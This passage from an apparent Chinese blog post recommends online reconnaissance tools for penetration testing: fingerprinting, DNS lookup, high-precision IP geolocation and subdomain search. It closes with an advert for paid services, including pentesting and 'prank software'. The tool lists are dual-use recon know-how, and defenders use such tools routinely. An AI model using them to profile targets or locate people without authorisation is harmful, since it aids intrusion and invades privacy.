title="5、指纹："></a>5、指纹：</h2><p>​潮汐指纹：<a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p><p><img src="https://pic.imgdb.cn/item/656a22a4c458853aefc49036.png" alt="图片"></p><h2 id="6、解析记录"><a href="#6、解析记录" class="headerlink" title="6、解析记录"></a>6、解析记录</h2><p>​解析记录1：<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a></p><p><img src="https://pic.imgdb.cn/item/656a22adc458853aefc4a7db.png" alt="图片"></p><p>​站长解析记录：<a href="https://tool.chinaz.com/nslookup">https://tool.chinaz.com/nslookup</a></p><p><img src="https://pic.imgdb.cn/item/656a22bec458853aefc4d103.png" alt="图片"></p><h2 id="7、ip高精准定位："><a href="#7、ip高精准定位：" class="headerlink" title="7、ip高精准定位："></a>7、ip高精准定位：</h2><p>​1：<a href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</a>  （最近可十米之内）</p><p><img src="https://pic.imgdb.cn/item/656a22c9c458853aefc4ecd2.png" alt="图片"></p><p>​2: <a href="https://chaipip.com/">https://chaipip.com/</a>     （这个开梯子进不去）</p><p><img src="https://pic.imgdb.cn/item/656a1930c458853aefaa751e.jpg"></p><h2 id="8、子域名查询"><a href="#8、子域名查询" class="headerlink" title="8、子域名查询"></a>8、子域名查询</h2><p>​子域名、ip反查：<a href="https://www.dnsgrep.cn/">https://www.dnsgrep.cn/</a></p><p><img src="https://pic.imgdb.cn/item/656a22d7c458853aefc50cc0.png" alt="图片"></p><p>好了，暂时推荐这么多.如果有需要相关业务推荐,可以联系邮箱:<a href="mailto:Sgyling@gmail.com">Sgyling@gmail.com</a></p><p>技术微信:Yancy_76</p><p>技术员企鹅:1041041042</p><p>最后打一个广告:</p><pre><code>承接业务:承接网站开发，web开发，python爬虫脚本，windows程序，shell脚本，易脚本，渗透测试，网站安全性测试，论坛搭建。android开发，（安卓开发）等，apk反编译，区块链资金流向分析，区块链代币合约编写,低价开发/渗透，送7天质保，7天内出现问题无偿修改。支持恶搞软件。不接毕设!需要签合同!</code></pre><p><img src="https://pic.imgdb.cn/item/656a1e0bc458853aefb85848.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
